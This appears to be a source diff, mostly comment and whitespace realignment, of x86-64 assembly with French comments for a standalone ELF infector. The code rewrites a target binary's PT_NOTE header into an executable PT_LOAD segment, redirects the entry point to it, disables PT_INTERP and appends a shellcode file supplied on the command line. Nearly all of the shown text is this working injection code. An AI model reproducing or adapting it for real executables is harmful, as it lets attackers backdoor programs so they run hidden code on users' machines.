@@ -72,7 +72,7 @@ _start:
     xor r9, r9                      ; r9 = 0 (offset dans le fichier)
     mov rax, 9                      ; syscall mmap
     syscall
-    
+
     mov [buf], rax
     mov rax, [buf]                  ; base du fichier mappe
     mov rbx, [rax + E_PHOFF]        ; e_phoff = offset table phdrs
@@ -86,90 +86,91 @@ _start:
     mov dword [rbx + P_TYPE], 0     ; change en PT_NULL
 
 .skip_interp:
-    cmp dword [rbx + P_TYPE], PT_LOAD       ; c'est un LOAD ?
-    jne .skip_max   ; non, on passe
-    mov rdx, [rbx + P_VADDR]    ; vaddr du LOAD
-    add rdx, [rbx + P_MEMSZ]    ; + memsz = fin du LOAD
-    cmp rdx, r14    ; plus grand que le max actuel ?
-    jle .skip_max   ; non, on passe
-    mov r14, rdx    ; oui, on met a jour le max
+    cmp dword [rbx + P_TYPE], PT_LOAD ;saute si pas ptload
+    jne .skip_max                   ; non, on passe
+    mov rdx, [rbx + P_VADDR]        ; vaddr du LOAD
+    add rdx, [rbx + P_MEMSZ]        ; + memsz = fin du LOAD
+    cmp rdx, r14                    ; plus grand que le max actuel ?
+    jle .skip_max                   ; non, on passe
+    mov r14, rdx                    ; oui, on met a jour le max
+
 .skip_max:
 
     cmp dword [rbx + P_TYPE], PT_NOTE       ; on compare la veleur p_type du phdr avec PT_NOTE
     je .found   ; si oui, saute a .found
 
-    add rbx, P_PHDR_SIZE    ; phdr suivant (56 octets)
-    dec rcx ; decremente le compteur
-    jnz .find_note  ; si reste > 0, on reboucle
-    mov rax, 60 ; syscall exit
-    mov rdi, 1  ; code de retour 1 (erreur)
+    add rbx, P_PHDR_SIZE            ; phdr suivant (56 octets)
+    dec rcx                         ; decremente le compteur
+    jnz .find_note                  ; si reste > 0, on reboucle
+    mov rax, 60                     ; syscall exit
+    mov rdi, 1                      ; code de retour 1 (erreur)
     syscall
 
-    .found: ; label : PT_NOTE trouve
+    .found:                         ; label : PT_NOTE trouve
 
     ; vaddr = max(fsize, r14) arrondi au 0x1000 superieur
-    mov rax, [fsize]    ; taille du fichier
-    cmp rax, r14    ; fsize > fin du dernier LOAD ?
-    jge .use_fsize  ; oui, on garde fsize
-    mov rax, r14    ; non, on prend r14
+    mov rax, [fsize]                ; taille du fichier
+    cmp rax, r14                    ; fsize > fin du dernier LOAD ?
+    jge .use_fsize                  ; oui, on garde fsize
+    mov rax, r14                    ; non, on prend r14
+
 .use_fsize:
-    add rax, 0xFFF  ; arrondir au 0x1000 superieur
-    and rax, ~0xFFF     ; enleve les 12 bits du bas
-    mov r14, rax    ; r14 = vaddr finale (pour ftruncate)
+    add rax, 0xFFF                  ; arrondir au 0x1000 superieur
+    and rax, ~0xFFF                 ; enleve les 12 bits du bas
+    mov r14, rax                    ; r14 = vaddr finale (pour ftruncate)
 
 
     mov dword [rbx + P_TYPE], PT_LOAD   ; type = PT_LOAD
     mov dword [rbx + P_FLAGS], PF_R | PF_X ; flags = lisible + executable
-    mov [rbx + P_OFFSET], rax ; offset = vaddr
-    mov [rbx + P_VADDR], rax ; vaddr
-    mov [rbx + P_PADDR], rax ; paddr
-    mov qword [rbx + P_FILESZ], 0  ; filesz = 0 pour l'instant
-    mov qword [rbx + P_MEMSZ], 0  ; memsz = 0 pour l'instant
+    mov [rbx + P_OFFSET], rax       ; offset = vaddr
+    mov [rbx + P_VADDR], rax        ; vaddr
+    mov [rbx + P_PADDR], rax        ; paddr
+    mov qword [rbx + P_FILESZ], 0   ; filesz = 0 pour l'instant
+    mov qword [rbx + P_MEMSZ], 0    ; memsz = 0 pour l'instant
     mov qword [rbx + P_ALIGN], 0x1000 ; alignement page
-    mov rcx, [buf] ; base du fichier mappe
-    mov [rcx + E_ENTRY], rax    ; e_entry = vaddr du shellcode
+    mov rcx, [buf]                  ; base du fichier mappe
+    mov [rcx + E_ENTRY], rax        ; e_entry = vaddr du shellcode
 
     ; ouvrir le shellcode
-    mov rdi, [rsp + 24] ; argv[2] = chemin du shellcode
-    xor rsi, rsi ; O_RDONLY
-    mov rax, 2 ; syscall open
+    mov rdi, [rsp + 24]             ; argv[2] = chemin du shellcode
+    xor rsi, rsi                    ; O_RDONLY
+    mov rax, 2                      ; syscall open
     syscall
     test rax, rax
-    js .exit_ok ; si erreur, on sort proprement
-    mov r12, rax ; on garde le fd dans r12
-    mov rdi, r12 ;  on le remet dans rdi pour lseek
-    xor rsi, rsi ; offset 0
-    mov rdx, 2 ; SEEK_END
-    mov rax, 8 ; syscall lseek
+    js .exit_ok                     ; si erreur, on sort proprement
+    mov r12, rax                    ; on garde le fd dans r12
+    mov rdi, r12                    ; on le remet dans rdi pour lseek
+    xor rsi, rsi                    ; offset 0
+    mov rdx, 2                      ; SEEK_END
+    mov rax, 8                      ; syscall lseek
     syscall
-    mov r15, rax ; r15 = taille du shellcode
+    mov r15, rax                    ; r15 = taille du shellcode
 
-    xor rdi, rdi ; addr = NULL
-    mov rsi, r15 ; taille du shellcode
-    mov rdx, 1 ; PROT_READ
-    mov r10, 2 ; MAP_PRIVATE
-    mov r8, r12 ; fd du shellcode
-    xor r9, r9 ; offset 0
-    mov rax, 9 ; syscall mmap
+    xor rdi, rdi                    ; addr = NULL
+    mov rsi, r15                    ; taille du shellcode
+    mov rdx, 1                      ; PROT_READ
+    mov r10, 2                      ; MAP_PRIVATE
+    mov r8, r12                     ; fd du shellcode
+    xor r9, r9                      ; offset 0
+    mov rax, 9                      ; syscall mmap
     syscall
-    mov r13, rax ; r13 = pointeur vers le shellcode
-    mov [rbx + P_FILESZ], r15 ; filesz = taille du shellcode
-    mov [rbx + P_MEMSZ], r15 ; memsz = taille du shellcode
+    mov r13, rax                    ; r13 = pointeur vers le shellcode
+    mov [rbx + P_FILESZ], r15       ; filesz = taille du shellcode
+    mov [rbx + P_MEMSZ], r15        ; memsz = taille du shellcode
 
 
-    ; append du shellcode
-    ; 1 se placer a l'offset vaddr (r14)
+    ; append du shellcode,se placer a l'offset vaddr (r14)
     mov rdi, [fd]
-    mov rsi, r14    ; offset = vaddr
-    mov rdx, 0      ; SEEK_SET
-    mov rax, 8      ; lseek
+    mov rsi, r14                    ; offset = vaddr
+    mov rdx, 0                      ; SEEK_SET
+    mov rax, 8                      ; lseek
     syscall
 
     ; 2 ecrire le shellcode (etend le fichier au passage)
     mov rdi, [fd]
-    mov rsi, r13    ; pointeur shellcode
-    mov rdx, r15    ; taille
-    mov rax, 1      ; write
+    mov rsi, r13                    ; pointeur shellcode
+    mov rdx, r15                    ; taille
+    mov rax, 1                      ; write
     syscall
 
     ; exit(0)
